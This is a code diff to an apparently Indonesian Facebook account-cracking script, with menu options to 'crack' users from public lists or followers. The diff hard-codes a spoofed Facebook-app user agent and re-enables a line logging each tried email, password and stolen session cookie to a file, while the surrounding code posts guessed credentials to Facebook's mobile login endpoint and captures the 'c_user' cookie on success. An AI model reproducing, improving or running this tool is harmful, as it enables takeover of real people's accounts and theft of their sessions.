@@ -9,6 +9,8 @@ from rich.console import Console
 from rich.columns import Columns
 from rich.panel import Panel as panel
 from rich.console import Console as sol
+_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+open("ua.txt","w").write(_)
 try:ugen = open('ua.txt','r').read().splitlines()
 except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
 try:ugen2 = open('ua.txt','r').read().splitlines()
@@ -117,8 +119,8 @@ def daftar_menu():
         console.print(Columns(dia))
     except Exception as e:
         Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
-    lk = open('ua.txt','r').read().splitlines()
-    dia.append(panel(f'[bold white]YOUR UA = {lk}',width=50,padding=(0,3),style=f"bold white"))
+    lk = open('ua.txt','r').read()
+    dia.append(panel(f'[bold green]YOUR UA = {lk}',width=50,padding=(0,3),style=f"bold white"))
     console.print(Columns(lk))
     Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
 [bold green]2[bold white]. Crack User Dari Pengikut
@@ -381,7 +383,7 @@ class crack:
                         'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
                     })
                     response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
-                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
+                    open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                     if 'c_user' in r.cookies.get_dict().keys():
                         try:
                             self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
